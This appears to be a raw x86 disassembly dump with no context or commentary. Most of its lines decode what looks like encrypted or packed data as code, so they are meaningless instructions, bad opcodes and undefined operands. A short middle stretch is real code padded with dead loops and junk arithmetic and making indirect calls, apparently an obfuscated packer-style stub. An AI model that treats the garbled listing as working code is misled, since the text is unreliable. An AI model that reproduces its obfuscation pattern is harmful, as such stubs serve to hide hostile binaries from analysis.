  40cda2:	mov    edx,DWORD PTR [ebx]
  40cda4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cda5:	inc    edx
  40cda6:	add    dh,BYTE PTR [edx+0x74c43b1a]
  40cdac:	call   0x9550:0x11b05f4
  40cdb3:	add    edi,ebx
  40cdb5:	mov    ds:0x88c985c8,al
  40cdba:	sub    eax,0xbc8b075a
  40cdbf:	mov    eax,0xb0c93085
  40cdc4:	addr16 push esp
  40cdc6:	push   0xc7d22478
  40cdcb:	gs rol cl,0x3
  40cdcf:	ret    0x6fe9
  40cdd2:	add    al,BYTE PTR [eax]
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx+0x5cb091be],eax
  40cde3:	rcr    BYTE PTR [edx-0x5b],1
  40cde6:	xor    BYTE PTR [eax+0x70],0xc9
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40cd9c
  40cdee:	inc    ebx
  40cdef:	sub    eax,0x70dded5e
  40cdf4:	stc    
  40cdf5:	loop   0x40cdc3
  40cdf7:	inc    ebx
  40cdf8:	dec    eax
  40cdf9:	sub    dl,BYTE PTR [esi+0x746c4d85]
  40cdff:	mov    ebp,cr2
  40ce02:	js     0x40ce36
  40ce04:	nop
  40ce05:	jecxz  0x40ce2c
  40ce07:	lods   al,BYTE PTR ds:[esi]
  40ce08:	lds    edx,FWORD PTR [eax-0x64]
  40ce0b:	add    eax,DWORD PTR [esi+0x77eb3555]
  40ce11:	inc    esp
  40ce12:	pop    edx
  40ce13:	pop    ebp
  40ce14:	mov    dh,ah
  40ce16:	xor    DWORD PTR [ebx-0x1522503d],edi
  40ce1c:	aas    
  40ce1d:	push   cs
  40ce1e:	jge    0x40ce9d
  40ce20:	dec    ebx
  40ce21:	push   ss
  40ce22:	pop    esp
  40ce23:	int    0xf1
  40ce25:	loope  0x40ce7e
  40ce27:	xor    eax,0xfc0237d9
  40ce2c:	or     ebx,esp
  40ce2e:	aaa    
  40ce2f:	das    
  40ce30:	sub    BYTE PTR [ecx+0x44ab4b16],dl
  40ce36:	sub    al,0xa9
  40ce38:	jp     0x40ceb3
  40ce3a:	test   DWORD PTR [eax],esp
  40ce3c:	or     al,0xcf
  40ce3e:	push   ebx
  40ce3f:	inc    edx
  40ce40:	push   0xc9c55a5b
  40ce45:	xchg   ecx,eax
  40ce46:	sub    ah,BYTE PTR [edi-0x42]
  40ce49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce4a:	add    al,al
  40ce4c:	out    dx,al
  40ce4d:	mov    bh,0x8b
  40ce4f:	xchg   ebx,eax
  40ce50:	adc    DWORD PTR [ebx+0x67066055],esi
  40ce56:	addr16 sub cl,0x72
  40ce5a:	jle    0x40cdf8
  40ce5c:	lahf   
  40ce5d:	cmp    al,0x5f
  40ce5f:	or     BYTE PTR [ecx+edx*1+0x58156804],bl
  40ce66:	and    eax,0xb5870e15
  40ce6b:	dec    edi
  40ce6c:	xchg   ch,bh
  40ce6e:	mov    ebp,0x8126b532
  40ce73:	(bad)  [esi-0x70e7e20f]
  40ce79:	pop    ebx
  40ce7a:	ss mov ah,0xb2
  40ce7d:	add    ah,ch
  40ce7f:	and    ecx,eax
  40ce81:	int    0x9b
  40ce83:	mov    ds:0x393557ec,eax
  40ce88:	or     bl,ch
  40ce8a:	jp     0x40ced6
  40ce8c:	pop    edi
  40ce8d:	inc    eax
  40ce8e:	repz pusha 
  40ce90:	fnstsw ax
  40ce92:	scas   al,BYTE PTR es:[edi]
  40ce93:	sub    ebp,DWORD PTR [ecx+ecx*1]
  40ce96:	test   ch,bl
  40ce98:	out    0x39,eax
  40ce9a:	adc    DWORD PTR [edx],edi
  40ce9c:	jmp    0x44fc:0x2a6805db
  40cea3:	mov    WORD PTR [esi],ss
  40cea5:	sbb    DWORD PTR [eax+0xf],0xad76b686
  40ceac:	fldcw  WORD PTR ds:0x2b2af6e0
  40ceb2:	mov    edi,?
  40ceb4:	stos   DWORD PTR es:[edi],eax
  40ceb5:	call   DWORD PTR [edi+0x40ea6113]
  40cebb:	mul    edi
  40cebd:	dec    eax
  40cebe:	aas    
  40cebf:	(bad)  
  40cec0:	cdq    
  40cec1:	inc    esp
  40cec2:	jae    0x40cf39
  40cec4:	jmp    FWORD PTR [esi+0x72]
  40cec7:	shr    DWORD PTR [ebp-0x62],1
  40ceca:	js     0x40cee1
  40cecc:	sbb    ch,al
  40cece:	or     esi,DWORD PTR [esi+edi*8]
  40ced1:	push   esi
  40ced2:	lods   al,BYTE PTR ds:[esi]
  40ced3:	mov    cx,WORD PTR ds:0xae6280f1
  40ceda:	and    ecx,DWORD PTR [edx+0x515e741d]
  40cee0:	cmc    
  40cee1:	inc    eax
  40cee2:	std    
  40cee3:	shr    DWORD PTR [eax-0x66420901],1
  40cee9:	dec    esp
  40ceea:	xor    al,0x57
  40ceec:	xor    DWORD PTR [ebx+0x768f258b],edi
  40cef2:	push   edi
  40cef3:	mov    eax,ds:0x3322cb6b
  40cef8:	ret    
  40cef9:	dec    esp
  40cefa:	fisttp WORD PTR [esi]
  40cefc:	and    al,0xaa
  40cefe:	pop    ecx
  40ceff:	icebp  
  40cf00:	cmc    
  40cf01:	lods   eax,DWORD PTR ds:[esi]
  40cf02:	gs int 0x33
  40cf05:	leave  
  40cf06:	popa   
  40cf07:	aad    0xee
  40cf09:	test   eax,0x44a3d1a2
  40cf0e:	dec    esi
  40cf0f:	inc    esi
  40cf10:	paddusb mm0,QWORD PTR [ebp-0x39]
  40cf14:	inc    edx
  40cf15:	cs je  0x40cee6
  40cf18:	mov    bh,0xca
  40cf1a:	or     esp,edi
  40cf1c:	outs   dx,DWORD PTR ds:[esi]
  40cf1d:	int3   
  40cf1e:	loope  0x40cf3d
  40cf20:	sub    eax,0x3bd0a0a7
  40cf25:	outs   dx,DWORD PTR ds:[esi]
  40cf26:	stos   DWORD PTR es:[edi],eax
  40cf27:	pop    ecx
  40cf28:	fistp  DWORD PTR [eax-0x5b7e53d9]
  40cf2e:	das    
  40cf2f:	jno    0x40cf68
  40cf31:	or     al,BYTE PTR [eax-0x35]
  40cf34:	push   esi
  40cf35:	add    BYTE PTR [esi+esi*2],bh
  40cf38:	pop    esp
  40cf39:	mov    ?,WORD PTR [ebx+eiz*4+0x26]
  40cf3d:	les    esi,FWORD PTR [ebx]
  40cf3f:	xchg   esi,eax
  40cf40:	jo     0x40cedf
  40cf42:	xor    bh,bl
  40cf44:	pop    ebp
  40cf45:	dec    edx
  40cf46:	push   ecx
  40cf47:	ret    0x6588
  40cf4a:	test   al,0x41
  40cf4c:	call   0x6cd:0x48d7961e
  40cf53:	loop   0x40cf0f
  40cf55:	repnz cs xor eax,0x8240dd06
  40cf5c:	dec    ebp
  40cf5d:	adc    bl,0x3f
  40cf60:	jno    0x40cfcc
  40cf62:	(bad)  
  40cf64:	mov    ebx,0x8e1870e6
  40cf69:	inc    esi
  40cf6a:	jbe    0x40cf60
  40cf6c:	jo     0x40cf89
  40cf6e:	adc    DWORD PTR [ebp+0x37],edi
  40cf71:	scas   al,BYTE PTR es:[edi]
  40cf72:	dec    edx
  40cf73:	call   0x3f87:0x355c074f
  40cf7a:	push   ds
  40cf7b:	and    al,0x8b
  40cf7d:	repz jno 0x40cfcc
  40cf80:	imul   edi
  40cf82:	dec    edi
  40cf83:	pop    edx
  40cf84:	ins    DWORD PTR es:[edi],dx
  40cf85:	pop    ds
  40cf86:	sbb    bh,ah
  40cf88:	xchg   BYTE PTR [edi-0x3b],dh
  40cf8b:	fst    DWORD PTR [esi-0x265c591a]
  40cf91:	inc    ebp
  40cf92:	inc    edi
  40cf93:	push   ebx
  40cf94:	retf   0xac5e
  40cf97:	sbb    al,0x33
  40cf99:	push   cs
  40cf9a:	pop    edi
  40cf9b:	fisttp WORD PTR [ebp-0x3441cd96]
  40cfa1:	test   al,0xe5
  40cfa3:	imul   DWORD PTR [ecx-0x6c325aac]
  40cfa9:	adc    al,0x85
  40cfab:	add    BYTE PTR [eax],bh
  40cfad:	repz mov bl,0x4b
  40cfb0:	add    BYTE PTR [ecx-0x7e314d51],0x19
  40cfb7:	push   edx
  40cfb8:	out    dx,eax
  40cfb9:	cmp    DWORD PTR ss:[ebx-0x6b],esp
  40cfbd:	mov    ch,0x98
  40cfbf:	stc    
  40cfc0:	ret    
  40cfc1:	jmp    esp
  40cfc3:	retf   0x8e9c
  40cfc6:	out    dx,al
  40cfc7:	dec    ebx
  40cfc8:	shr    BYTE PTR [edi+esi*4+0x45],0x33
  40cfcd:	mov    cl,0x3f
  40cfcf:	rol    BYTE PTR [esi-0x2e6a0a72],1
  40cfd5:	xor    BYTE PTR [edx+0x5e],al
  40cfd8:	push   eax
  40cfd9:	jecxz  0x40cf84
  40cfdb:	adc    BYTE PTR [edi-0x18],bl
  40cfde:	dec    ebx
  40cfdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfe0:	push   esp
  40cfe1:	retf   
  40cfe2:	aas    
  40cfe3:	inc    eax
  40cfe4:	add    ebp,DWORD PTR [ecx+0x2a]
  40cfe7:	push   ss
  40cfe8:	xor    edi,DWORD PTR [eax]
  40cfea:	push   esp
  40cfeb:	xor    ecx,esp
  40cfed:	mov    al,ds:0xdce1bfd8
  40cff2:	push   es
  40cff3:	aad    0xba
  40cff5:	pop    edx
  40cff6:	clc    
  40cff7:	mov    eax,0x35d96f5e
  40cffc:	daa    
  40cffd:	cmp    eax,0x740783eb
  40d002:	jp     0x40d021
  40d004:	int3   
  40d005:	arpl   WORD PTR ds:0x10746836,sp
  40d00b:	(bad)  
  40d00c:	jne    0x40d000
  40d00e:	das    
  40d00f:	pop    cx
  40d011:	mov    dl,0xd3
  40d013:	sbb    bl,BYTE PTR [edx]
  40d015:	or     al,0x8d
  40d017:	jno    0x40d067
  40d019:	mov    WORD PTR [edx-0x6dd4c1a7],ds
  40d01f:	adc    BYTE PTR [ebp-0x3371c7b],ch
  40d025:	pop    eax
  40d026:	sti    
  40d027:	push   ecx
  40d028:	and    esp,DWORD PTR [ebx+edx*4+0x6a]
  40d02c:	mov    ah,0x12
  40d02e:	ret    
  40d02f:	ret    
  40d030:	pop    ecx
  40d031:	jbe    0x40cfdd
  40d033:	inc    esi
  40d034:	jl     0x40d0a0
  40d036:	call   0x4e2f:0xd8083e21
  40d03d:	leave  
  40d03e:	jg     0x40cfd5
  40d040:	xor    edi,DWORD PTR [ecx+0x4b]
  40d043:	jno    0x40cfe8
  40d045:	sbb    al,0x62
  40d047:	inc    ecx
  40d048:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4342be
  40d088:	mov    ecx,DWORD PTR ds:0x432872
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434296,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434296,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434296,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432b6a
  40d0d1:	cmp    DWORD PTR ds:0x434296,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434296
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434296,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434296
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434296,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434272,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434272
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434272,ecx
  40d118:	cmp    DWORD PTR ds:0x434272,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434272,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432cc6
  40d137:	call   DWORD PTR ds:0x4328ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432d6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434331
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43427e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432cde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432604,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434321,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43428a,0x11
  40d197:	cmp    DWORD PTR ds:0x43428a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43428a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432b6e
  40d1c4:	cmp    DWORD PTR ds:0x43428a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43428a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43428a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43428a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43428a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432cd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434296
  40d1fe:	mov    DWORD PTR ds:0x432cd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43426e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434325,0x43426a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434276,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434315,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434321,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434321
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434321,ecx
  40d255:	cmp    DWORD PTR ds:0x434321,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434321,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4328f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4325fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4325fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4325fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432c22
  40d2ba:	cmp    DWORD PTR ds:0x4325fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4325fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4325fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4325fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4325fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4325f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434329
  40d2fa:	add    DWORD PTR ds:0x434292,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0x6ca6624d
  40d319:	dec    ecx
  40d31a:	mov    BYTE PTR [esi-0x73],bh
  40d31d:	jo     0x40d38f
  40d31f:	dec    ecx
  40d320:	jge    0x40d392
  40d322:	jo     0x40d2ab
  40d324:	push   ebp
  40d325:	jne    0x40d2f9
  40d327:	mov    ebp,0xe89da0b3
  40d32c:	jge    0x40d390
  40d32e:	(bad)  
  40d32f:	stc    
  40d330:	adc    edx,DWORD PTR [ecx-0x5f7621e4]
  40d336:	xchg   edx,eax
  40d337:	sbb    ch,BYTE PTR [edx-0x6e]
  40d33a:	push   ds
  40d33b:	pop    esi
  40d33c:	pop    es
  40d33d:	(bad)  
  40d33e:	inc    edx
  40d33f:	mov    ebp,0x11d1cab8
  40d344:	gs in  al,dx
  40d346:	stos   DWORD PTR es:[edi],eax
  40d347:	lock cmp edx,DWORD PTR [eax]
  40d34a:	lea    ecx,[ebx]
  40d34c:	sub    esp,esi
  40d34e:	add    al,0x21
  40d350:	(bad)  
  40d351:	cmp    bh,BYTE PTR [edi]
  40d353:	sbb    edi,ebp
  40d355:	inc    edx
  40d356:	cmp    dh,BYTE PTR [ecx-0x7e]
  40d359:	cli    
  40d35a:	cmp    BYTE PTR [edx+0x76],0xe4
  40d35e:	xchg   ecx,eax
  40d35f:	imul   ecx,esp,0x57974379
  40d365:	outs   dx,BYTE PTR ds:[esi]
  40d366:	sbb    edi,DWORD PTR [edx+0xe60110e]
  40d36c:	mov    esi,0x48313983
  40d371:	bound  ecx,QWORD PTR [esi]
  40d373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d374:	jmp    0x9bda2fa9
  40d379:	push   esp
  40d37a:	popf   
  40d37b:	rol    BYTE PTR [esi+ebp*1+0x3a1ac19a],1
  40d382:	in     al,0xf4
  40d384:	in     eax,0x90
  40d386:	cmp    ecx,esi
  40d388:	dec    ecx
  40d389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d38a:	fisubr DWORD PTR [ecx+0x29c5a701]
  40d390:	adc    BYTE PTR [esi-0x6315a6d7],dl
  40d396:	add    BYTE PTR [eax+0x54555010],bl
  40d39c:	xor    eax,0xc47e10de
  40d3a1:	jp     0x40d357
  40d3a3:	cmp    edi,eax
  40d3a5:	push   0x53
  40d3a7:	dec    ebx
  40d3a8:	loop   0x40d408
  40d3aa:	loopne 0x40d40a
  40d3ac:	add    BYTE PTR [eax+0x655f24a4],al
  40d3b2:	or     esp,DWORD PTR [edi-0x52a1b55f]
  40d3b8:	push   edi
  40d3b9:	sub    cl,cl
  40d3bb:	inc    esp
  40d3bc:	addr16 dec ebp
  40d3be:	pop    ecx
  40d3bf:	pop    ss
  40d3c0:	cmp    edx,DWORD PTR [ebp+0x45d299c6]
  40d3c6:	gs xchg edi,eax
  40d3c8:	push   edi
  40d3c9:	sbb    edi,esi
  40d3cb:	mov    esi,0xd92f6af
  40d3d0:	dec    edx
  40d3d1:	jge    0x40d363
  40d3d3:	call   0xcf34bb1e
  40d3d8:	shl    edi,cl
  40d3da:	cli    
  40d3db:	sub    dl,0xbb
  40d3de:	icebp  
  40d3df:	imul   ebp,esi,0x22ec9ce7
  40d3e5:	xchg   DWORD PTR [ecx-0x7098edaa],ebp
  40d3eb:	sub    eax,0x97da109f
  40d3f0:	jge    0x40d418
  40d3f2:	push   edx
  40d3f3:	or     DWORD PTR [esi-0x3b31a247],eax
  40d3f9:	mov    bl,0x31
  40d3fb:	out    0x6d,eax
  40d3fd:	retf   
  40d3fe:	pop    esi
  40d3ff:	in     eax,dx
  40d400:	pop    eax
  40d401:	cwde   
  40d402:	pop    ss
  40d403:	stos   BYTE PTR es:[edi],al
  40d404:	retf   0x3e92
  40d407:	fwait
  40d408:	shl    BYTE PTR [esi+0x58],0x9a
  40d40c:	jp     0x40d3b8
  40d40e:	xor    al,0x2
  40d410:	es push esp
  40d412:	sub    al,0xf6
  40d414:	mov    ebx,0xbaa626d2
  40d419:	fbld   TBYTE PTR [eax-0x4c]
  40d41c:	repz mov eax,0x4f15db78
  40d422:	in     eax,0x54
  40d424:	mov    eax,0x301ffc1d
  40d429:	pop    ebp
  40d42a:	cmp    eax,0x3df17e7d
  40d42f:	sbb    ch,BYTE PTR [ebp-0x41b5fac8]
  40d435:	in     al,0xf2
  40d437:	imul   edx
  40d439:	mov    ebx,0x3524b12
  40d43e:	push   ds
  40d43f:	bound  ebp,QWORD PTR [esi]
  40d441:	cmp    BYTE PTR [edi-0x54],cl
  40d444:	add    DWORD PTR [esi],ebx
  40d446:	repz in al,dx
  40d448:	sub    DWORD PTR [ebp+0x2224a131],ebx
  40d44e:	mov    ecx,0x285ed6f8
  40d453:	add    eax,0x7e3fee6c
  40d458:	bound  ebp,QWORD PTR [ebx+eax*2]
  40d45b:	icebp  
  40d45c:	dec    ebx
  40d45d:	aaa    
  40d45e:	push   0x21
  40d460:	xor    DWORD PTR [ebx-0x54ec5fa3],ebp
  40d466:	sub    ebx,DWORD PTR [ebx+edx*4-0x36]
  40d46a:	push   ss
  40d46b:	jge    0x40d457
  40d46d:	icebp  
  40d46e:	mov    dl,0xda
  40d470:	dec    esi
  40d471:	mov    eax,0x5d050e0f
  40d476:	int    0xfc
  40d478:	adc    DWORD PTR [ebp+0x6],0xffffff9f
  40d47c:	push   edi
  40d47d:	cwde   
  40d47e:	out    0xcf,al
  40d480:	mov    eax,ds:0xb65d17a
  40d485:	stc    
  40d486:	(bad)  
  40d487:	jle    0x40d434
  40d489:	xchg   ebp,eax
  40d48a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d48b:	retf   0xb821
  40d48e:	pop    edi
  40d48f:	dec    esp
  40d490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d491:	or     DWORD PTR [eax+0x52d6bda3],esi
  40d497:	and    eax,0xb80cb207
  40d49c:	or     al,0x6b
  40d49e:	xor    esp,esp
  40d4a0:	repz push ss
  40d4a2:	lock xchg ebp,ebp
  40d4a5:	or     ecx,DWORD PTR [edi]
  40d4a7:	fidiv  DWORD PTR [ebx-0x15db58e4]
  40d4ad:	jmp    0x3c05244f
  40d4b2:	fdiv   QWORD PTR [ebx]
  40d4b4:	leave  
  40d4b5:	jge    0x40d4a8
  40d4b7:	push   ebx
  40d4b8:	cmp    BYTE PTR [edx+edx*8],bh
  40d4bb:	rol    DWORD PTR [eax+0x3],0x1b
  40d4bf:	mov    ss,ebp
  40d4c1:	sub    eax,DWORD PTR [ebp+0x15002475]
  40d4c7:	lock nop
  40d4c9:	and    BYTE PTR [eax+0x262a2ed0],dh
  40d4cf:	adc    eax,0xe5f2be59
  40d4d4:	jge    0x40d505
  40d4d6:	push   edi
  40d4d7:	adc    edx,DWORD PTR [ebx+edx*8-0x197f4c1f]
  40d4de:	fist   WORD PTR ds:0x88330cba
  40d4e4:	pop    ebp
  40d4e5:	cmp    ch,BYTE PTR [edx-0x27]
  40d4e8:	and    BYTE PTR [edi],bh
  40d4ea:	(bad)  
  40d4eb:	xor    dh,BYTE PTR [esi-0x7d]
  40d4ee:	aam    0x64
  40d4f0:	add    edi,DWORD PTR [edx]
  40d4f2:	in     al,dx
  40d4f3:	push   cs
  40d4f4:	in     eax,dx
  40d4f5:	ins    BYTE PTR es:[edi],dx
  40d4f6:	mov    edi,0xa3d75eef
  40d4fb:	(bad)  
  40d4fc:	(bad)  
  40d4fd:	jle    0x40d4d0
  40d4ff:	xchg   ecx,eax
  40d500:	daa    
  40d501:	mov    al,ds:0x1331ef6a
  40d506:	cmp    BYTE PTR [ebx],al
  40d508:	lods   al,BYTE PTR ds:[esi]
  40d509:	adc    DWORD PTR [esi],edi
  40d50b:	es imul esp,ebx,0xf563b4b1
  40d512:	mov    ch,0x53
  40d514:	rcr    BYTE PTR [ecx+0x2e],1
  40d517:	and    ebp,DWORD PTR [ecx-0x80]
  40d51a:	addr16 add al,0x2d
  40d51d:	mov    esp,0x202aac7a
  40d522:	mov    ds:0x6be8a72e,al
  40d527:	dec    ecx
  40d528:	mov    edx,0x61540eb7
  40d52d:	push   0x42dac489
  40d532:	ins    BYTE PTR es:[edi],dx
  40d533:	icebp  
  40d534:	jge    0x40d4fb
  40d536:	in     al,dx
  40d537:	sub    BYTE PTR [esi+0x5b50e2c],0xfd
  40d53e:	lahf   
  40d53f:	pop    esp
  40d540:	add    al,0xdf
  40d542:	jecxz  0x40d50e
  40d544:	sub    ebx,esi
  40d546:	cs jmp 0x40d52d
  40d549:	sbb    DWORD PTR [eax],0xffffffa2
  40d54c:	and    ebp,DWORD PTR [esi-0x11b37be9]
  40d552:	sar    DWORD PTR [edx+esi*2],0xe4
  40d556:	sub    DWORD PTR [edx+0x69545101],esi
  40d55c:	out    dx,eax
  40d55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d55e:	mul    BYTE PTR [ecx-0x80]
  40d561:	rol    DWORD PTR [esi],cl
  40d563:	aam    0x6
  40d565:	pushf  
  40d566:	std    
  40d567:	push   ss
  40d568:	jecxz  0x40d58e
  40d56a:	test   DWORD PTR [edi],ebx
  40d56c:	jo     0x40d557
  40d56e:	fcomp  QWORD PTR [edx+0x26b10d91]
  40d574:	daa    
  40d575:	or     DWORD PTR [edi+esi*2],ecx
  40d578:	pushf  
  40d579:	cld    
  40d57a:	or     ah,BYTE PTR [ebx-0x2f]
  40d57d:	xor    ebx,ecx
  40d57f:	add    eax,esi
  40d581:	jnp    0x40d503
  40d583:	scas   eax,DWORD PTR es:[edi]
  40d584:	into   
  40d585:	mov    dl,0x7
  40d587:	rcr    DWORD PTR [ebx+0x473cc529],cl
  40d58d:	rol    BYTE PTR [esi-0x6d],0xb4
  40d591:	daa    
  40d592:	xor    ebx,ebx
  40d594:	adc    bh,BYTE PTR [ebp+0x22d6a60e]
  40d59a:	mov    bh,0x63
  40d59c:	dec    edx
  40d59d:	addr16 shl ah,cl
  40d5a0:	(bad)  
  40d5a1:	imul   ebp,DWORD PTR [esi-0x1f],0xeed9e97d
  40d5a8:	div    DWORD PTR [eax+0x77604cae]
  40d5ae:	cmp    eax,0xa388498e
  40d5b3:	adc    eax,0xd210177e
  40d5b8:	ins    DWORD PTR es:[edi],dx
  40d5b9:	mov    ds:0x3693488c,al
  40d5be:	stos   BYTE PTR es:[edi],al
  40d5bf:	aad    0xd5
  40d5c1:	mov    bl,0x61
  40d5c3:	scas   eax,DWORD PTR es:[edi]
  40d5c4:	cmp    eax,0x2089ec34
  40d5c9:	pop    es
  40d5ca:	in     eax,dx
  40d5cb:	in     al,dx
  40d5cc:	xlat   BYTE PTR ds:[ebx]
  40d5cd:	jb     0x40d631
  40d5cf:	or     eax,0x331791f5
  40d5d4:	mov    al,ds:0xa8ff149b
  40d5d9:	xchg   DWORD PTR [edx+0x50],ecx
  40d5dc:	add    BYTE PTR [ebp+0x6b],ah
  40d5df:	stc    
  40d5e0:	and    eax,0xa9f0059a
  40d5e5:	call   0x5315c664
  40d5ea:	push   0xffffffd9
  40d5ec:	sub    al,0x95
  40d5ee:	push   edi
  40d5ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5f0:	xchg   esi,eax
  40d5f1:	jno    0x40d615
  40d5f3:	jo     0x40d5f8
  40d5f5:	(bad)  
  40d5f6:	(bad)  
  40d5f7:	and    DWORD PTR [ebp-0x134f15fb],ecx
  40d5fd:	ss sbb cl,ch
  40d600:	sub    al,0x6b
  40d602:	mov    esi,0x5f6aa83e
  40d607:	pushf  
  40d608:	inc    esi
  40d609:	sbb    eax,0x161d966a
  40d60e:	dec    esi
  40d60f:	loop   0x40d67c
  40d611:	mov    bl,dl
  40d613:	inc    edi
  40d614:	daa    
  40d615:	dec    esi
  40d616:	aas    
  40d617:	jmp    0x5997:0xf6a41b30
  40d61e:	aam    0x3b
  40d620:	repnz pop eax
  40d622:	or     edx,edi
  40d624:	sub    edi,esp
  40d626:	add    ah,al
  40d628:	add    ch,BYTE PTR [esi]
  40d62a:	pop    esp
  40d62b:	pop    ss
  40d62c:	outs   dx,BYTE PTR ds:[esi]
  40d62d:	stos   BYTE PTR es:[edi],al
  40d62e:	sbb    ch,BYTE PTR [esi+ecx*1-0x73ed4b26]
  40d635:	inc    ebp
  40d636:	inc    esp
  40d637:	test   bl,ah
  40d639:	out    0xda,al
  40d63b:	mov    ebx,0x490a9ceb
  40d640:	xor    esi,ecx
  40d642:	iret   
  40d643:	daa    
